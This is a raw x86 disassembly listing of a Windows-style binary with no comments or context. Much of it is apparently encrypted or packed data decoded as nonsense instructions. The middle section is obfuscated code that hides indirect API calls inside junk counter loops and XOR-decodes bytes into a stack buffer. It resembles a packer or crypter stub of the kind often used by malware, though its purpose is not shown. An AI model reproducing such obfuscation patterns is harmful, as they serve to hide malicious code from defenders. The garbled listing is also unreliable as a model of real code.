  40ef20:	fdivp  st(3),st
  40ef22:	jl     0x40eecc
  40ef24:	push   esi
  40ef25:	pop    esi
  40ef26:	sbb    eax,0x13ae0c49
  40ef2b:	inc    edi
  40ef2c:	sub    eax,0x9b169763
  40ef31:	ret    0xe7c5
  40ef34:	push   ss
  40ef35:	and    bh,ch
  40ef37:	add    DWORD PTR [edx+0x666b9bf],edx
  40ef3d:	(bad)  
  40ef3e:	sub    ebx,DWORD PTR [eax-0x1098c719]
  40ef44:	dec    ecx
  40ef45:	xchg   ecx,eax
  40ef46:	adc    al,BYTE PTR [ebx]
  40ef48:	inc    edx
  40ef49:	sbb    bl,bl
  40ef4b:	xor    DWORD PTR [ecx+0x1fc4f14e],0xfffffffe
  40ef52:	test   DWORD PTR [ebp-0x77],esi
  40ef55:	or     dh,BYTE PTR [esi+0x7dab668c]
  40ef5b:	push   edi
  40ef5c:	pop    ebp
  40ef5d:	iret   
  40ef5e:	jp     0x40eefb
  40ef60:	fcmovne st,st(5)
  40ef62:	or     al,0xbd
  40ef64:	pop    ds
  40ef65:	add    eax,0xc8ce1376
  40ef6a:	mov    ds:0x13b2b331,al
  40ef6f:	xor    eax,0x637d91d8
  40ef74:	test   BYTE PTR [eax],ah
  40ef76:	adc    DWORD PTR [eax-0x4d],ebx
  40ef79:	in     eax,dx
  40ef7a:	mov    dl,0x18
  40ef7c:	dec    ebp
  40ef7d:	jae    0x40ef61
  40ef7f:	fld    DWORD PTR [esi-0x3828705d]
  40ef85:	dec    ebx
  40ef86:	push   es
  40ef87:	cwde   
  40ef88:	cmp    eax,DWORD PTR [ebp+0x39]
  40ef8b:	sbb    cl,cl
  40ef8d:	cmp    eax,0x1bf2286
  40ef92:	(bad)  
  40ef93:	cli    
  40ef94:	scas   al,BYTE PTR es:[edi]
  40ef95:	out    dx,al
  40ef96:	and    ebp,ecx
  40ef98:	inc    edi
  40ef99:	imul   eax,DWORD PTR [ebp+0x1b],0x62
  40ef9d:	out    0xb5,al
  40ef9f:	pusha  
  40efa0:	add    al,0x39
  40efa2:	cmp    bl,BYTE PTR [ecx-0x43]
  40efa5:	and    BYTE PTR [ebp+0x50],bl
  40efa8:	push   esp
  40efa9:	(bad)  
  40efaa:	int    0x1f
  40efac:	sub    esp,DWORD PTR [edx]
  40efae:	dec    edx
  40efaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb0:	adc    ebp,esi
  40efb2:	mov    al,BYTE PTR [ebp-0x1]
  40efb5:	and    DWORD PTR ds:0x429018,0x0
  40efbf:	xor    ecx,ecx
  40efc1:	or     ecx,DWORD PTR ds:0x429018
  40efc7:	inc    ecx
  40efc8:	mov    DWORD PTR ds:0x429018,ecx
  40efce:	cmp    DWORD PTR ds:0x429018,0xa
  40efd5:	jne    0x40efe1
  40efdb:	call   DWORD PTR ds:0x42e9b3
  40efe1:	cmp    DWORD PTR ds:0x429018,0x9
  40efe8:	jne    0x40effb
  40efee:	mov    ecx,DWORD PTR ds:0x429018
  40eff4:	inc    ecx
  40eff5:	mov    DWORD PTR ds:0x429018,ecx
  40effb:	cmp    DWORD PTR ds:0x429018,0x1e
  40f002:	jb     0x40efbf
  40f008:	sub    DWORD PTR ds:0x42c014,ecx
  40f00e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f011:	xor    al,0x73
  40f013:	sub    al,0x9
  40f015:	mov    DWORD PTR ds:0x42b000,0xef4
  40f01f:	mov    BYTE PTR [ecx],al
  40f021:	and    DWORD PTR ds:0x42b01c,0x42a004
  40f02b:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f032:	sbb    DWORD PTR ds:0x429024,0xfd3
  40f03c:	push   ebx
  40f03d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f044:	mov    ecx,DWORD PTR [ebp-0x18]
  40f047:	xor    eax,0x6376
  40f04c:	push   esi
  40f04d:	and    DWORD PTR ds:0x42c01c,0x0
  40f057:	jmp    0x40f06a
  40f05c:	xor    eax,eax
  40f05e:	add    eax,DWORD PTR ds:0x42c01c
  40f064:	inc    eax
  40f065:	mov    ds:0x42c01c,eax
  40f06a:	cmp    DWORD PTR ds:0x42c01c,0x16
  40f071:	jae    0x40f0bd
  40f077:	cmp    DWORD PTR ds:0x42c01c,0x4
  40f07e:	jne    0x40f0a0
  40f084:	push   DWORD PTR [ebp-0x24]
  40f087:	push   0x42901c
  40f08c:	push   DWORD PTR [ebp-0x18]
  40f08f:	push   DWORD PTR [ebp-0x14]
  40f092:	push   DWORD PTR [ebp-0x24]
  40f095:	push   0x236f
  40f09a:	call   DWORD PTR ds:0x42e9b7
  40f0a0:	cmp    DWORD PTR ds:0x42c01c,0x3
  40f0a7:	jne    0x40f0b8
  40f0ad:	mov    eax,ds:0x42c01c
  40f0b2:	inc    eax
  40f0b3:	mov    ds:0x42c01c,eax
  40f0b8:	jmp    0x40f05c
  40f0bd:	mov    eax,0x7510899
  40f0c2:	xor    ecx,eax
  40f0c4:	mov    esi,0x3272e0
  40f0c9:	adc    DWORD PTR ds:0x42a014,0x429010
  40f0d3:	push   edi
  40f0d4:	add    ecx,esi
  40f0d6:	jmp    0x40f0fa
  40f0db:	mov    DWORD PTR ds:0x42c014,0x1850
  40f0e5:	mov    dl,BYTE PTR [ebp-0x1]
  40f0e8:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f0ef:	mov    DWORD PTR ds:0x42a00c,0x213a
  40f0f9:	inc    ecx
  40f0fa:	mov    DWORD PTR ds:0x42b000,0x51ce
  40f104:	cmp    ecx,0x40
  40f107:	jb     0x40f0db
  40f10d:	mov    edx,DWORD PTR [ebp-0x18]
  40f110:	xor    edx,eax
  40f112:	add    edx,esi
  40f114:	mov    DWORD PTR ds:0x42c00c,0x7eb4
  40f11e:	jmp    0x40f1de
  40f123:	sub    DWORD PTR ds:0x42d018,edi
  40f129:	mov    edi,DWORD PTR [ebp+0x8]
  40f12c:	and    DWORD PTR ds:0x42d008,0x0
  40f136:	jmp    0x40f14a
  40f13b:	xor    ecx,ecx
  40f13d:	or     ecx,DWORD PTR ds:0x42d008
  40f143:	inc    ecx
  40f144:	mov    DWORD PTR ds:0x42d008,ecx
  40f14a:	cmp    DWORD PTR ds:0x42d008,0x18
  40f151:	jae    0x40f175
  40f157:	cmp    DWORD PTR ds:0x42d008,0x26
  40f15e:	jne    0x40f16a
  40f164:	call   DWORD PTR ds:0x42e9bb
  40f16a:	jmp    0x40f13b
  40f16f:	xor    DWORD PTR ds:0x42a00c,edx
  40f175:	mov    ecx,0x8a8c
  40f17a:	xor    DWORD PTR ds:0x42a004,0x50dc
  40f184:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f189:	mov    edi,0x3b50
  40f18e:	add    DWORD PTR ds:0x429008,0x42b008
  40f198:	add    cx,di
  40f19b:	xor    DWORD PTR ds:0x429018,0x2fa9
  40f1a5:	movzx  ecx,cx
  40f1a8:	mov    DWORD PTR [ebp-0xc],ecx
  40f1ab:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1ae:	add    DWORD PTR ds:0x42b000,0x4595
  40f1b8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f1bc:	mov    DWORD PTR ds:0x42c010,0x3cf8
  40f1c6:	xor    ecx,0x8a8c
  40f1cc:	add    ecx,edi
  40f1ce:	mov    edi,0x13c
  40f1d3:	mov    edi,DWORD PTR [ebp-0xc]
  40f1d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40f1dd:	inc    edx
  40f1de:	mov    DWORD PTR ds:0x42c008,0x3284
  40f1e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1eb:	mov    DWORD PTR ds:0x42d00c,0x2d6d
  40f1f5:	cmp    edx,ecx
  40f1f7:	jne    0x40f123
  40f1fd:	xor    edi,DWORD PTR ds:0x42900c
  40f203:	mov    ecx,DWORD PTR [ebp-0x18]
  40f206:	and    DWORD PTR ds:0x429024,0x0
  40f210:	jmp    0x40f224
  40f215:	xor    edx,edx
  40f217:	or     edx,DWORD PTR ds:0x429024
  40f21d:	inc    edx
  40f21e:	mov    DWORD PTR ds:0x429024,edx
  40f224:	cmp    DWORD PTR ds:0x429024,0x10
  40f22b:	jae    0x40f27a
  40f231:	cmp    DWORD PTR ds:0x429024,0xa
  40f238:	jne    0x40f24f
  40f23e:	push   DWORD PTR [ebp-0x14]
  40f241:	push   0x42b018
  40f246:	push   DWORD PTR [ebp-0x14]
  40f249:	call   DWORD PTR ds:0x42e9bf
  40f24f:	cmp    DWORD PTR ds:0x429024,0x9
  40f256:	jne    0x40f26b
  40f25c:	xor    edx,edx
  40f25e:	xor    edx,DWORD PTR ds:0x429024
  40f264:	inc    edx
  40f265:	mov    DWORD PTR ds:0x429024,edx
  40f26b:	jmp    0x40f215
  40f270:	adc    DWORD PTR ds:0x42d00c,0x5b30
  40f27a:	mov    edx,DWORD PTR [ebp+0x10]
  40f27d:	xor    edi,0x523a
  40f283:	xor    ecx,eax
  40f285:	dec    DWORD PTR ds:0x42b010
  40f28b:	add    ecx,esi
  40f28d:	mov    DWORD PTR [edx],ecx
  40f28f:	sbb    DWORD PTR ds:0x42d004,0x42a008
  40f299:	mov    ecx,DWORD PTR [ebp-0x18]
  40f29c:	inc    edi
  40f29d:	xor    ecx,eax
  40f29f:	mov    edi,DWORD PTR ds:0x42a000
  40f2a5:	xor    DWORD PTR ds:0x42a004,edi
  40f2ab:	add    ecx,esi
  40f2ad:	mov    DWORD PTR ds:0x42d000,0x15
  40f2b7:	cmp    DWORD PTR ds:0x42d000,0x0
  40f2be:	je     0x40f2f6
  40f2c4:	cmp    DWORD PTR ds:0x42d000,0x1a
  40f2cb:	jne    0x40f2e4
  40f2d1:	push   0x42e111
  40f2d6:	push   0x42e0c7
  40f2db:	push   DWORD PTR [ebp-0x20]
  40f2de:	call   DWORD PTR ds:0x42e9c7
  40f2e4:	mov    edi,DWORD PTR ds:0x42d000
  40f2ea:	dec    edi
  40f2eb:	mov    DWORD PTR ds:0x42d000,edi
  40f2f1:	jmp    0x40f2b7
  40f2f6:	mov    DWORD PTR [ebp-0xc],ecx
  40f2f9:	not    edi
  40f2fb:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40f302:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40f309:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40f310:	and    DWORD PTR ds:0x42b010,ecx
  40f316:	mov    ecx,DWORD PTR [ebp-0x14]
  40f319:	mov    DWORD PTR ds:0x42b018,0x1d
  40f323:	cmp    DWORD PTR ds:0x42b018,0x0
  40f32a:	je     0x40f37c
  40f330:	cmp    DWORD PTR ds:0x42b018,0xc
  40f337:	jne    0x40f348
  40f33d:	push   0x42e0d9
  40f342:	call   DWORD PTR ds:0x42e9cb
  40f348:	cmp    DWORD PTR ds:0x42b018,0xd
  40f34f:	jne    0x40f362
  40f355:	mov    edi,DWORD PTR ds:0x42b018
  40f35b:	dec    edi
  40f35c:	mov    DWORD PTR ds:0x42b018,edi
  40f362:	xor    edi,edi
  40f364:	xor    edi,DWORD PTR ds:0x42b018
  40f36a:	dec    edi
  40f36b:	mov    DWORD PTR ds:0x42b018,edi
  40f371:	jmp    0x40f323
  40f376:	not    DWORD PTR ds:0x42d018
  40f37c:	mov    DWORD PTR [ebp+0x8],ecx
  40f37f:	sub    edi,ecx
  40f381:	mov    ecx,DWORD PTR [ebp+0x8]
  40f384:	and    DWORD PTR ds:0x42a010,0x408f
  40f38e:	xor    ecx,eax
  40f390:	add    ecx,esi
  40f392:	mov    ecx,0x242ebed
  40f397:	not    edi
  40f399:	mov    edi,0xf641bea
  40f39e:	je     0x418714
  40f3a4:	mov    edx,DWORD PTR [ebp+0x8]
  40f3a7:	or     DWORD PTR ds:0x429008,0x3119
  40f3b1:	mov    ebx,DWORD PTR [ebp-0x8]
  40f3b4:	adc    DWORD PTR ds:0x42a018,0x42c014
  40f3be:	xor    edx,eax
  40f3c0:	xor    ebx,eax
  40f3c2:	sub    DWORD PTR ds:0x42c004,0x429010
  40f3cc:	sub    edx,ebx
  40f3ce:	sub    edx,esi
  40f3d0:	xor    edx,eax
  40f3d2:	mov    DWORD PTR [ebp+0x8],edx
  40f3d5:	inc    DWORD PTR ds:0x42b010
  40f3db:	mov    edx,DWORD PTR [ebp+0x8]
  40f3de:	mov    ebx,DWORD PTR [ebp-0x58]
  40f3e1:	add    edx,0x5708f8
  40f3e7:	sub    DWORD PTR ds:0x42c01c,0x72ca
  40f3f1:	imul   edx,ebx
  40f3f4:	xor    DWORD PTR ds:0x429024,edi
  40f3fa:	mov    DWORD PTR [ebp-0x58],edx
  40f3fd:	and    DWORD PTR ds:0x42d004,0x0
  40f407:	mov    ebx,DWORD PTR ds:0x42d004
  40f40d:	inc    ebx
  40f40e:	mov    DWORD PTR ds:0x42d004,ebx
  40f414:	cmp    DWORD PTR ds:0x42d004,0x1e
  40f41b:	jne    0x40f42c
  40f421:	push   0x42a004
  40f426:	call   DWORD PTR ds:0x42e9d3
  40f42c:	cmp    DWORD PTR ds:0x42d004,0x17
  40f433:	jb     0x40f407
  40f439:	mov    edx,DWORD PTR [ebp+0x8]
  40f43c:	mov    ebx,DWORD PTR [ebp-0x54]
  40f43f:	add    edx,0x64f8da
  40f445:	xor    DWORD PTR ds:0x42b004,0x42b000
  40f44f:	or     edx,ebx
  40f451:	adc    DWORD PTR ds:0x42c014,0x3307
  40f45b:	mov    DWORD PTR [ebp-0x54],edx
  40f45e:	add    DWORD PTR ds:0x42d004,0x3241
  40f468:	mov    edx,DWORD PTR [ebp+0x8]
  40f46b:	sub    DWORD PTR ds:0x42900c,0x6cc3
  40f475:	mov    ebx,DWORD PTR [ebp-0x50]
  40f478:	xor    DWORD PTR ds:0x42b014,0x42c01c
  40f482:	add    edx,ecx
  40f484:	adc    DWORD PTR ds:0x42c000,0x429028
  40f48e:	xor    edx,ebx
  40f490:	mov    DWORD PTR [ebp-0x50],edx
  40f493:	and    DWORD PTR ds:0x429018,0x0
  40f49d:	mov    ebx,DWORD PTR ds:0x429018
  40f4a3:	inc    ebx
  40f4a4:	mov    DWORD PTR ds:0x429018,ebx
  40f4aa:	cmp    DWORD PTR ds:0x429018,0x1f
  40f4b1:	jne    0x40f4cc
  40f4b7:	push   0x42c010
  40f4bc:	push   0x42c018
  40f4c1:	push   0x42a008
  40f4c6:	call   DWORD PTR ds:0x42e993
  40f4cc:	cmp    DWORD PTR ds:0x429018,0x1e
  40f4d3:	jb     0x40f49d
  40f4d9:	inc    edx
  40f4da:	mov    edx,DWORD PTR [ebp+0x8]
  40f4dd:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f4e0:	add    DWORD PTR ds:0x42d010,0x42d01c
  40f4ea:	add    edx,edi
  40f4ec:	adc    DWORD PTR ds:0x42d018,0x42b01c
  40f4f6:	and    edx,ebx
  40f4f8:	mov    DWORD PTR [ebp-0x4c],edx
  40f4fb:	or     edx,DWORD PTR ds:0x42b000
  40f501:	mov    edx,DWORD PTR [ebp+0x8]
  40f504:	mov    ebx,DWORD PTR ds:0x42d000
  40f50a:	sub    DWORD PTR ds:0x42a000,ebx
  40f510:	mov    ebx,DWORD PTR [ebp-0x48]
  40f513:	or     DWORD PTR ds:0x42c000,0x42c010
  40f51d:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f524:	mov    DWORD PTR [ebp-0x48],edx
  40f527:	mov    edx,DWORD PTR [ebp+0x8]
  40f52a:	mov    ebx,0xfa5e15e2
  40f52f:	inc    DWORD PTR ds:0x42d018
  40f535:	sub    ebx,edx
  40f537:	movzx  edx,WORD PTR ds:0x42c018
  40f53e:	adc    edx,DWORD PTR ds:0x429028
  40f544:	mov    DWORD PTR ds:0x42c018,edx
  40f54a:	add    ebx,DWORD PTR [ebp-0x44]
  40f54d:	mov    DWORD PTR [ebp-0x44],ebx
  40f550:	and    DWORD PTR ds:0x42b018,0x0
  40f55a:	jmp    0x40f56c
  40f55f:	mov    edx,DWORD PTR ds:0x42b018
  40f565:	inc    edx
  40f566:	mov    DWORD PTR ds:0x42b018,edx
  40f56c:	cmp    DWORD PTR ds:0x42b018,0x19
  40f573:	jae    0x40f616
  40f579:	cmp    DWORD PTR ds:0x42b018,0x6
  40f580:	jne    0x40f594
  40f586:	push   0x0
  40f588:	push   DWORD PTR [ebp-0x10]
  40f58b:	push   DWORD PTR [ebp-0x28]
  40f58e:	call   DWORD PTR ds:0x42e997
  40f594:	cmp    DWORD PTR ds:0x42b018,0x5
  40f59b:	jne    0x40f5ae
  40f5a1:	mov    edx,DWORD PTR ds:0x42b018
  40f5a7:	inc    edx
  40f5a8:	mov    DWORD PTR ds:0x42b018,edx
  40f5ae:	jmp    0x40f55f
  40f5b3:	mov    DWORD PTR ds:0x42b00c,0x18
  40f5bd:	cmp    DWORD PTR ds:0x42b00c,0x0
  40f5c4:	je     0x40f616
  40f5ca:	cmp    DWORD PTR ds:0x42b00c,0x1e
  40f5d1:	jne    0x40f5fa
  40f5d7:	push   0x3551
  40f5dc:	push   DWORD PTR [ebp-0x28]
  40f5df:	push   0x42c000
  40f5e4:	push   DWORD PTR [ebp-0x10]
  40f5e7:	push   0x1896
  40f5ec:	push   0x8105
  40f5f1:	push   DWORD PTR [ebp-0xc]
  40f5f4:	call   DWORD PTR ds:0x42e99f
  40f5fa:	mov    edx,DWORD PTR ds:0x42b00c
  40f600:	dec    edx
  40f601:	mov    DWORD PTR ds:0x42b00c,edx
  40f607:	jmp    0x40f5bd
  40f60c:	add    DWORD PTR ds:0x42d00c,0x25c6
  40f616:	mov    edx,DWORD PTR [ebp+0x8]
  40f619:	adc    DWORD PTR ds:0x42d018,0x42a00c
  40f623:	xor    edx,eax
  40f625:	adc    DWORD PTR ds:0x42b010,0x4589
  40f62f:	add    edx,esi
  40f631:	mov    DWORD PTR ds:0x42d014,0x3f58
  40f63b:	jne    0x40f3a4
  40f641:	jmp    0x418714
  40f646:	adc    edx,edx
  40f648:	mov    edx,DWORD PTR [ebp-0xc]
  40f64b:	sub    edx,esi
  40f64d:	xor    edx,eax
  40f64f:	mov    DWORD PTR [ebp-0x5c],edx
  40f652:	mov    edx,DWORD PTR [ebp-0x10]
  40f655:	mov    ebx,DWORD PTR [ebp-0x8]
  40f658:	xor    edx,eax
  40f65a:	xor    ebx,eax
  40f65c:	sub    edx,ebx
  40f65e:	sub    edx,esi
  40f660:	xor    edx,eax
  40f662:	mov    DWORD PTR [ebp-0x10],edx
  40f665:	mov    edx,DWORD PTR [ebp-0x14]
  40f668:	mov    DWORD PTR [ebp+0x8],edx
  40f66b:	jmp    0x411a66
  40f670:	mov    edx,DWORD PTR [ebp+0x8]
  40f673:	mov    ebx,DWORD PTR [ebp-0x8]
  40f676:	xor    edx,eax
  40f678:	xor    ebx,eax
  40f67a:	sub    edx,ebx
  40f67c:	sub    edx,esi
  40f67e:	xor    edx,eax
  40f680:	mov    DWORD PTR [ebp+0x8],edx
  40f683:	jmp    0x411a09
  40f688:	aaa    
  40f689:	xchg   BYTE PTR [edi-0x3a],cl
  40f68c:	jae    0x40f709
  40f68e:	mov    ebx,0xae43537b
  40f693:	xor    al,0x82
  40f695:	jl     0x40f64d
  40f697:	jg     0x40f620
  40f699:	retf   0x7a7a
  40f69c:	add    DWORD PTR [edi+0x7a],ebx
  40f69f:	jp     0x40f644
  40f6a1:	mov    dh,0xb4
  40f6a3:	aad    0x2d
  40f6a5:	shr    DWORD PTR [ebp-0x4254d8a],1
  40f6ab:	pop    edi
  40f6ac:	xor    eax,0x5fe8beba
  40f6b1:	jp     0x40f6f4
  40f6b3:	cld    
  40f6b4:	cmp    DWORD PTR [edi],edi
  40f6b6:	int3   
  40f6b7:	cmp    DWORD PTR [edi],esi
  40f6b9:	cmp    al,BYTE PTR [esi+edx*4+0x33]
  40f6bd:	outs   dx,DWORD PTR ds:[esi]
  40f6be:	xchg   ecx,eax
  40f6bf:	das    
  40f6c0:	cdq    
  40f6c1:	push   edi
  40f6c2:	jne    0x40f72d
  40f6c4:	xchg   edi,eax
  40f6c5:	mov    ds:0x1872876f,eax
  40f6ca:	pop    ss
  40f6cb:	lahf   
  40f6cc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40f6ce:	cmp    bl,BYTE PTR [edi-0x50d8e0cb]
  40f6d4:	ja     0x40f68e
  40f6d6:	jne    0x40f66e
  40f6d8:	jmp    0xb7cd16e1
  40f6dd:	gs in  eax,0xd0
  40f6e0:	mov    edi,0x95abfb3
  40f6e5:	loope  0x40f696
  40f6e7:	(bad)  
  40f6e8:	aam    0x50
  40f6ea:	dec    eax
  40f6eb:	or     edi,edi
  40f6ed:	pop    ebx
  40f6ee:	into   
  40f6ef:	ds push ebx
  40f6f1:	out    dx,al
  40f6f2:	xor    esi,eax
  40f6f4:	icebp  
  40f6f5:	shl    DWORD PTR [ecx-0x6],1
  40f6f8:	dec    ebp
  40f6f9:	aad    0x63
  40f6fb:	and    esp,DWORD PTR [edi-0x13]
  40f6fe:	dec    ebp
  40f6ff:	lock fs aad 0xbb
  40f703:	test   DWORD PTR ds:0x7fe1cabd,esi
  40f709:	in     al,dx
  40f70a:	ss mov dl,al
  40f70d:	adc    al,0x2d
  40f70f:	jmp    0x50bafc0e
  40f714:	rcl    BYTE PTR [esi+eiz*8-0x3292485e],1
  40f71b:	add    DWORD PTR [edx-0x77],0xffffffd9
  40f71f:	mov    eax,0x2a1b40e8
  40f724:	mov    bh,0x78
  40f726:	mov    bh,0x72
  40f728:	mov    esi,0xededf18
  40f72d:	sti    
  40f72e:	sub    ah,BYTE PTR [esi+0x14]
  40f731:	call   0x4c18:0xa13eaaa5
  40f738:	add    bh,bl
  40f73a:	pop    ebx
  40f73b:	jmp    0xeec6e947
  40f740:	jg     0x40f74d
  40f742:	xor    eax,edx
  40f744:	das    
  40f745:	icebp  
  40f746:	out    0x81,eax
  40f748:	pop    edi
  40f749:	xchg   BYTE PTR [edi+0x24c3c8d8],bh
  40f74f:	(bad)  
  40f750:	cli    
  40f751:	inc    esp
  40f752:	mov    dl,0xe8
  40f754:	test   al,0x33
  40f756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f757:	rol    DWORD PTR [esi],cl
  40f759:	mov    eax,ds:0x78fc38be
  40f75e:	outs   dx,DWORD PTR ds:[esi]
  40f75f:	mov    edx,0x4ed13e44
  40f764:	pop    ss
  40f765:	aam    0xa8
  40f767:	pop    ecx
  40f768:	popf   
  40f769:	add    DWORD PTR [edx],ebp
  40f76b:	add    ebp,edx
  40f76d:	inc    esp
  40f76e:	sub    al,0x5
  40f770:	loopne 0x40f73e
  40f772:	ja     0x40f784
  40f774:	ret    
  40f775:	mov    al,0x55
  40f777:	jns    0x40f7b6
  40f779:	mov    ebp,0x2f7c4b0f
  40f77e:	pop    edi
  40f77f:	mov    edi,0xf3eb1046
  40f784:	lods   eax,DWORD PTR ds:[esi]
  40f785:	and    ebp,DWORD PTR [edi+0x70]
  40f788:	sbb    eax,eax
  40f78a:	xor    eax,0xbf052bda
  40f78f:	(bad)  
  40f790:	in     al,0x48
  40f792:	lock cmp esi,DWORD PTR [edi+0x7a7101ed]
  40f799:	sbb    eax,0x7f70f4ff
  40f79e:	mov    ecx,0x7c16cf44
  40f7a3:	(bad)  [ebp-0x4a6ff190]
  40f7a9:	nop
  40f7aa:	ja     0x40f823
  40f7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ad:	inc    ecx
  40f7ae:	scas   eax,DWORD PTR es:[edi]
  40f7af:	mov    ecx,0xa6fe6da3
  40f7b4:	jae    0x40f7dc
  40f7b6:	(bad)  
  40f7b7:	out    dx,al
  40f7b8:	es cdq 
  40f7ba:	sub    al,BYTE PTR [edi+0x3b]
  40f7bd:	or     DWORD PTR [ebx],esp
  40f7bf:	jmp    0xfcd75ec7
  40f7c4:	push   0x17
  40f7c6:	and    cl,bh
  40f7c8:	jmp    0xedce:0x1292050c
  40f7cf:	loop   0x40f7b2
  40f7d1:	jl     0x40f784
  40f7d3:	fstp   TBYTE PTR [ebx+edx*1]
  40f7d6:	aaa    
  40f7d7:	mov    bl,0xc9
  40f7d9:	fisttp WORD PTR [ebx-0x74b7928b]
  40f7df:	and    al,0x21
  40f7e1:	sahf   
  40f7e2:	push   esi
  40f7e3:	inc    ebp
  40f7e4:	jle    0x40f7e7
  40f7e6:	push   cs
  40f7e7:	hlt    
  40f7e8:	sbb    edi,DWORD PTR [esi]
  40f7ea:	retf   0xedb9
  40f7ed:	in     eax,0x43
  40f7ef:	push   0xffffff9e
  40f7f1:	push   es
  40f7f2:	repnz xchg edi,eax
  40f7f4:	jge    0x40f77f
  40f7f6:	ret    0x88c5
  40f7f9:	mov    edi,0x9e5c7203
  40f7fe:	stos   BYTE PTR es:[edi],al
  40f7ff:	sub    bh,ah
  40f801:	cmp    eax,0x91d9bafc
  40f806:	or     al,BYTE PTR [edi+0x25f6df0f]
  40f80c:	or     DWORD PTR [edx],0xfffffff3
  40f80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f810:	mov    ecx,0x5c15fd09
  40f815:	cmp    BYTE PTR [edi-0x24],0xd6
  40f819:	cli    
  40f81a:	in     eax,0x4b
  40f81c:	gs out dx,al
  40f81e:	iret   
  40f81f:	(bad)  
  40f820:	in     al,0xf1
  40f822:	stc    
  40f823:	out    0x38,eax
  40f825:	cmp    BYTE PTR [ecx],ch
  40f827:	aam    0x61
  40f829:	outs   dx,DWORD PTR ds:[esi]
  40f82a:	data16 int 0x78
  40f82d:	in     al,dx
  40f82e:	mov    ecx,0x1d4b5db1
  40f833:	mov    ebp,0x21b1fe1a
  40f838:	cmc    
  40f839:	adc    BYTE PTR [esi],dh
  40f83b:	ja     0x40f888
  40f83d:	pop    ebx
  40f83e:	stos   DWORD PTR es:[edi],eax
  40f83f:	jae    0x40f818
  40f841:	imul   esp,DWORD PTR [eax-0x6b52ecef],0xffffffb0
  40f848:	or     eax,0xbede89b
  40f84d:	std    
  40f84e:	bound  ebp,QWORD PTR [esi]
  40f850:	cwde   
  40f851:	xor    BYTE PTR [esi+ebp*1+0x35],dl
  40f855:	bound  edi,QWORD PTR ds:[eax+ebx*2]
  40f859:	push   ds
  40f85a:	rcr    esi,1
  40f85c:	add    al,0x2
  40f85e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f85f:	jb     0x40f8d0
  40f861:	mov    ebp,DWORD PTR [edx+0x3a5ec8ec]
  40f867:	add    esp,ebp
  40f869:	xchg   ebx,eax
  40f86a:	jmp    esp
  40f86c:	nop
  40f86d:	xor    cl,BYTE PTR [esi+0x6fa295c2]
  40f873:	iret   
  40f874:	push   esp
  40f875:	outs   dx,DWORD PTR ds:[esi]
  40f876:	or     edi,edx
  40f878:	pop    ebx
  40f879:	push   0x89e877ef
  40f87e:	ja     0x40f874
  40f880:	cld    
  40f881:	or     eax,0xa20d669d
  40f886:	and    DWORD PTR [esi+edx*4+0x69],0x441dd6bd
  40f88e:	jbe    0x40f90a
  40f890:	mov    ch,0x47
  40f892:	stos   BYTE PTR es:[edi],al
  40f893:	(bad)  
  40f894:	sbb    DWORD PTR [eax-0x704347ab],eax
  40f89a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f89b:	inc    esi
  40f89c:	(bad)  
  40f89d:	out    dx,eax
  40f89e:	mov    ds:0xafd695ed,al
  40f8a3:	cmp    DWORD PTR [ebx-0x455c96d],edx
  40f8a9:	pop    esi
  40f8aa:	mov    edx,0x16d35716
  40f8af:	outs   dx,DWORD PTR ds:[esi]
  40f8b0:	mov    ebx,0x23a4112e
  40f8b5:	pop    ecx
  40f8b6:	or     BYTE PTR [ebx+0x5037ad17],dh
  40f8bc:	sahf   
  40f8bd:	jmp    0x9460:0xe5a101d6
  40f8c4:	popa   
  40f8c5:	not    edi
  40f8c7:	data16 je 0x40f909
  40f8ca:	or     esp,DWORD PTR [eax+0x4d30cfd4]
  40f8d0:	mov    ebx,0xf87adba8
  40f8d5:	jge    0x40f880
  40f8d7:	and    DWORD PTR [edi+0x6c258ccb],eax
  40f8dd:	test   BYTE PTR [edi+edi*2+0x15dac191],cl
  40f8e4:	fcomp  st(0)
  40f8e6:	push   eax
  40f8e7:	xchg   ebx,eax
  40f8e8:	(bad)  
  40f8e9:	lods   al,BYTE PTR ds:[esi]
  40f8ea:	or     eax,0xc2689dda
  40f8ef:	pusha  
  40f8f0:	cmp    eax,0x4f9ca11
  40f8f5:	cmovno edi,DWORD PTR [eax+0x3b221b10]
  40f8fc:	js     0x40f94c
  40f8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ff:	xlat   BYTE PTR ds:[ebx]
  40f900:	pushf  
  40f901:	push   ebp
  40f902:	inc    ebp
  40f903:	or     DWORD PTR [edx-0x647ed7d3],ebx
  40f909:	(bad)  
  40f90a:	aas    
  40f90b:	sub    cl,BYTE PTR [edx-0x18]
  40f90e:	rcl    DWORD PTR [ecx],0xe
  40f911:	sub    ebx,esi
  40f913:	gs jbe 0x40f917
  40f916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f917:	add    ch,BYTE PTR [ecx]
  40f919:	and    DWORD PTR [ebp+0x6f],0x30
  40f91d:	mov    dl,0x12
  40f91f:	hlt    
  40f920:	icebp  
  40f921:	and    bl,BYTE PTR [eax]
  40f923:	test   eax,0xf6d31ea8
  40f928:	out    dx,al
  40f929:	popa   
  40f92a:	push   ss
  40f92b:	mov    al,ch
  40f92d:	mov    WORD PTR [ecx+0xf738133],cs
  40f933:	in     al,0x39
  40f935:	mov    ds:0x52898327,al
  40f93a:	call   0xbf054a14
